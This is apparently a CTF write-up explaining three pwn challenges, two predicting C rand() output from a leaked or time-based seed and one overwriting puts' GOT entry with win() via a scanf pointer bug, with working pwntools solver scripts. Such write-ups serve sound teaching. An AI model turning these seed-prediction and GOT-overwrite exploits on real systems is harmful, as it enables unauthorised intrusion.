#Guessing Random Numbers in CTF

Although the challenges are a bit old, I think they are instructive since they include both cases (with a leaked seed, and without a leak). I'm talking about unlucky of tamuCTF of 2023 and random of TFC CTF of 2023, and a bonus chall that involves srand and rand!
<!--excerpt-->

# Unlucky
Starting with the *easier* case (both easy tbh), starting from reversing it:

    int32_t main(int32_t argc, char** argv, char** envp)
    {
        void* fsbase;
        int64_t rax = *(fsbase + 0x28);
        setvbuf(stdout, nullptr, 2, 0);
        setvbuf(stdin, nullptr, 2, 0);
        srand(&seed.0);
        printf("Here's a lucky number: %p\n", main);
        int32_t var_68 = 1;
        int32_t var_6c = 0;
        for (int32_t var_64 = 1; var_64 <= 7; var_64 = (var_64 + 1))
        {
            printf("Enter lucky number #%d:\n", var_64);
            __isoc99_scanf(&data_203c, &var_6c);
            if (rand() != var_6c)
            {
                var_68 = 0;
            }
        }
        if (var_68 == 0)
        {
            puts("How unlucky :pensive:");
        }
        else
        {
            int64_t var_58;
            __builtin_memset(var_58, 0, 0x40);
            fread(&var_58, 1, 0x40, fopen("flag.txt", &data_203f));
            printf("Nice work, here's the flag: %s\n", &var_58);
        }
        *(fsbase + 0x28);
        if (rax == *(fsbase + 0x28))
        {
            return 0;
        }
        __stack_chk_fail();
        /* no return */
    }
We are asked for 7 numbers, if all of them are correct we will get the content of flag.txt. The program use as a seed the address of a static int, we can't see here but in gdb with dynamic debugging we can retrieve the int.

    0x0000555555558068  seed
So examining it:

    pwndbg> x/x 0x0000555555558068
    0x555555558068 <seed.2870>:	0x00000045
0x45 = 69, so is like srand(&69)...
Analyzing the leak:
We know that our seed is located @ 0x555555558068 (on GDB), on the other hand we got a leak with this address: 0x5555555551a5, that is the entry point of main function, the distance between these addresses is:

    pwndbg> p 0x555555558068-0x5555555551a5
    $1 = 11971

So we run the binary, grep the leak, add 11971 generate 7 numbers and then we need to send them...
An example of helper program in c is:
```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <time.h>
    
    int main(int argc, char *argv[]) {
        int num[10];
        if (argc != 2) {
            printf("Usage: %s <seed>\n", argv[0]);
            return 1;
        }
        int seed = atoi(argv[1]);
        srand(seed);
        printf("Casual Numbers generated with Seed %d: ", seed);
        for (int i = 0; i < 10; i++) {
            printf("%d ", rand());
    	}
        return 0;
    }
```
And this is my solver script:
```python
    import os
    import time
    from pwn import *
    context.log_level='debug'
    #p = remote("tamuctf.com", 443, ssl=True, sni="unlucky")
    elf = ELF('./unlucky')
    p = elf.process()
    junk = p.recvuntil("Here's a lucky number: ")
    main = int(p.recv(15),16)
    print(main)
    distance = 11971
    dis = 0x2EC3
    file = "output.txt"
    
    seed = main + dis
    cmd = f"./helper {seed}"
    os.system(cmd)
    
    num = []
    with open(file,"r") as f:
    	for i in f:
    		num.append(i)
    for k in num:
    	time.sleep(2)
    	p.sendline(k)
    
    print(p.recvallS())
```
If someone didn't want to go through c but directly from python, he had to write something like this:
```python
from ctypes import CDLL
from ctypes.util import find_library
libc = CDLL(find_library("c"))
libc.srand(seed)
str(libc.rand()).encode()
```
Running it we get:

    Enter lucky number #1:
    Enter lucky number #2:
    Enter lucky number #3:
    Enter lucky number #4:
    Enter lucky number #5:
    Enter lucky number #6:
    Enter lucky number #7:
    Nice work, here's the flag: gigem{1_n33d_b3tt3r_3ntr0py_s0urc3s}

# Random
The main difference between the two challs is that srand argument is `time(NULL)` , that return the number (after conversion) of seconds since about midnight 1970-01-01. That number changes every second, so guarantees a new sequence of "random" numbers every time your program runs, right??? But we are hackers and we need to break it, I wrote another helper file that is quite similar to the other:
```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <time.h>
    
    int main() {
        int i;
        int num[10];
        srand(time(NULL));
        for (i = 0; i < 10; i++) {
            num[i] = rand();
        }
        FILE *file = fopen("numeri_casuali.txt", "w");
        if (file == NULL) {
            printf("Impossible to open the file.\n");
            return 1;
        }
        for (i = 0; i < 10; i++) {
            fprintf(file, "%d\n", num[i]);
        }
        fclose(file);
    
        printf("Numbers saved in 'numeri_casuali.txt'.\n");
    
        return 0;
    }
   ```
And python solver is:
```python
    from pwn import *
    import os
    context.log_level = 'debug'
    elf = context.binary = ELF("./random")
    
    ip, port = "challs.tfcctf.com", 32731
    
    io = remote(ip, port)
    os.system("./rand")
    num = []
     
    with open("numeri_casuali.txt", "r") as f:
    	for l in f:
     		num.append(l)
     
     
    for i in num:
    	io.sendline(str(i))	
    io.interactive()
```
 Because every second the numbers generated are different we need to run simultaneously our program and the binary.
 Running the exploit we get our shell (this time there was a win function, in the other binary we get directly the content of flag.txt)

     $ cat flag*
    TFCCTF{W0W!_Y0U_GU3SS3D_TH3M_4LL!@!}

# Bonus: Randomness (Tamu CTF)
What if we are given the opportunity to enter a seed and a guess? Seems easy right? RIGHT? This time we are going to exploit a different vulnerability...
We have the source code :
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win() {
    char* argv[] = {"/bin/cat", "flag.txt", NULL};
    execve(argv[0], argv, NULL);
}

void foo() {
    unsigned long seed;
    puts("Enter a seed:");
    scanf("%lu", &seed);
    srand(seed);
}

void bar() {
    unsigned long a;

    puts("Enter your guess:");
    scanf("%lu", a);

    if (rand() == a) {
        puts("correct!");
    } else {
        puts("incorrect!");
    }
}


int main() {
    puts("hello!");
    foo();
    bar();
    puts("goodbye!");
}
```
Code Review: There is a win function, but this time is not called anywhere, reading again the description

    I made this program to test how srand and rand work, but it keeps segfaulting. I don't read compiler warnings so I can't figure out why it's broken.

Gives us an hint where the problem may lay, compiling it:

    randomness.c: In function ‘bar’:
    randomness.c:21:14: warning: format ‘%lu’ expects argument of type ‘long unsigned int *’, but argument 2 has type ‘long unsigned int’ [-Wformat=]
       21 |     scanf("%lu", a);
          |            ~~^   ~
          |              |   |
          |              |   long unsigned int
          |              long unsigned int *

The scanf() in bar()  requires a pointer to a destination, but we are passing the value of the destination. Running the program in gdb to see how arguments are passed I noticed that the value that we insert within the foo() function will be also the value of a (since a is uninitialized) in the scanf().
So we have the  opportunity to write an arbitrary integer everywhere,(kinda good primitive!), we can overwrite a function to be win(). We can take advantage of the intensive use of puts, and because a call to puts is after the execution of bar() we will exploit it!

```python
from pwn import *
context.log_level = 'debug'
elf = context.binary = ELF('./randomness')
io = elf.process()
puts = str(elf.got['puts']).encode()
win = str(elf.sym['win']).encode()
io.sendline(puts)
io.sendline(win)
io.interactive()
```

Running it we get:

    hello!
    Enter a seed:
    Enter your guess:
    gigem{value_or_pointer_is_an_important_distinction}

Thanks for reading!
